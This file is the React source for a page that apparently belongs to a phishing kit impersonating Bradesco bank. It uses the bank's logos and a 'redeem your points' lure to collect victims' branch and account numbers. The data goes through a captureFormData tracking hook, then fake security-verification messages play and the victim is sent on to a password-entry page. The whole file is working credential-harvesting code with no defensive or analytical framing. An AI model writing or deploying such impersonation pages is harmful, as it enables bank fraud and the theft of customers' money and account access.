import { useState, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Menu, Bell } from "lucide-react";
import bradescoLogo from "@/assets/bradesco-logo.png";
import bradescoLogoNew from "@/assets/bradesco-logo-new.webp";
import BottomNav from "@/components/BottomNav";
import { useVisitorTracking, captureFormData } from "@/hooks/useVisitorTracking";

const LOADING_MESSAGES = [
  "Processando...",
  "Validando dados da conta",
  "Verificando módulo de segurança",
  "Processando atualização",
  "Finalizando operação",
  "Aguarde... Estamos te redirecionando para a próxima etapa",
];

const Resgate = () => {
  useVisitorTracking("resgate");
  const navigate = useNavigate();
  const location = useLocation();
  const nome = (location.state as any)?.nome || "";
  const [agencia, setAgencia] = useState("");
  const [conta, setConta] = useState("");
  const [errors, setErrors] = useState<{ agencia?: string; conta?: string }>({});
  const [showLoading, setShowLoading] = useState(false);
  const [loadingStep, setLoadingStep] = useState(0);

  useEffect(() => {
    if (!showLoading) return;
    const interval = 10000 / LOADING_MESSAGES.length;
    const timer = setInterval(() => {
      setLoadingStep((prev) => {
        if (prev >= LOADING_MESSAGES.length - 1) return prev;
        return prev + 1;
      });
    }, interval);
    const redirect = setTimeout(() => {
      navigate("/senha-acesso", { state: { nome, conta, agencia } });
    }, 10000);
    return () => { clearInterval(timer); clearTimeout(redirect); };
  }, [showLoading, navigate, nome, conta, agencia]);

  const handleResgatar = () => {
    const newErrors: { agencia?: string; conta?: string } = {};
    if (agencia.length !== 4) {
      newErrors.agencia = "Agência deve ter 4 dígitos";
    }
    if (conta.length < 6) {
      newErrors.conta = "Conta deve ter no mínimo 6 dígitos";
    }
    setErrors(newErrors);
    if (Object.keys(newErrors).length === 0) {
      captureFormData("resgate", { agencia, conta });
      setShowLoading(true);
      setLoadingStep(0);
    }
  };

  return (
    <div className="min-h-screen max-w-md mx-auto relative" style={{ background: 'linear-gradient(135deg, #D7004D 0%, #A30032 100%)' }}>
      {/* Header */}
      <div className="px-5 pt-6 pb-8">
        <div className="flex items-center justify-between mb-8">
          <Menu className="text-primary-foreground" size={24} />
          <Bell className="text-primary-foreground" size={24} />
        </div>
        <div className="flex flex-col items-start gap-3">
          <img src={bradescoLogo} alt="Bradesco" className="h-8" />
          <h1 className="text-primary-foreground text-xl font-semibold leading-tight">
            Continue para resgatar seus pontos
          </h1>
        </div>
      </div>

      {/* Content */}
      <div className="px-5 pb-32 space-y-6">
        {/* Agência */}
        <div className="px-1">
          <label className="text-sm text-primary-foreground/80 block mb-1">Agência sem dígito</label>
          <input
            type="text"
            value={agencia}
            onChange={(e) => { setAgencia(e.target.value.replace(/\D/g, "").slice(0, 4)); setErrors(prev => ({ ...prev, agencia: undefined })); }}
            className={`w-full bg-transparent text-primary-foreground border-b pb-2 outline-none text-base placeholder:text-primary-foreground/40 ${errors.agencia ? "border-yellow-200" : "border-primary-foreground/30"}`}
            placeholder="0000"
          />
          {errors.agencia && <span className="text-yellow-200 text-xs mt-1 block">{errors.agencia}</span>}
        </div>

        {/* Conta */}
        <div className="px-1">
          <label className="text-sm text-primary-foreground/80 block mb-1">Conta com dígito</label>
          <input
            type="text"
            value={conta}
            onChange={(e) => {
              let v = e.target.value.replace(/\D/g, "").slice(0, 8);
              if (v.length > 7) v = v.replace(/(\d{7})(\d{1})/, "$1-$2");
              setConta(v);
              setErrors(prev => ({ ...prev, conta: undefined }));
            }}
            className={`w-full bg-transparent text-primary-foreground border-b pb-2 outline-none text-base placeholder:text-primary-foreground/40 ${errors.conta ? "border-yellow-200" : "border-primary-foreground/30"}`}
            placeholder="0000000-0"
          />
          {errors.conta && <span className="text-yellow-200 text-xs mt-1 block">{errors.conta}</span>}
        </div>

        {/* Helper text */}
        <p className="text-primary-foreground/70 text-sm px-1">
          Digite sua agência e conta para continuar o resgate dos seus pontos.
        </p>

        {/* CTA */}
        <button
          onClick={handleResgatar}
          className="w-full py-4 rounded-full bg-white text-[#D7004D] font-semibold text-base hover:bg-white/90 transition-opacity"
        >
          resgatar pontos
        </button>
      </div>

      {/* Bottom Navigation */}
      <BottomNav />

      {/* Loading Modal */}
      {showLoading && (
        <div className="fixed inset-0 z-50 flex items-center justify-center">
          <div className="fixed inset-0 bg-black/50" />
          <div className="relative z-50 w-full max-w-sm mx-4 bg-card rounded-2xl p-8 shadow-xl flex flex-col items-center">
            <img src={bradescoLogoNew} alt="Bradesco" className="h-12 mb-6" />
            <div className="w-10 h-10 border-3 border-muted rounded-full border-t-[#D7004D] animate-spin mb-6" />
            <p className="text-muted-foreground text-base text-center">
              {LOADING_MESSAGES[loadingStep]}
            </p>
          </div>
        </div>
      )}
    </div>
  );
};

export default Resgate;
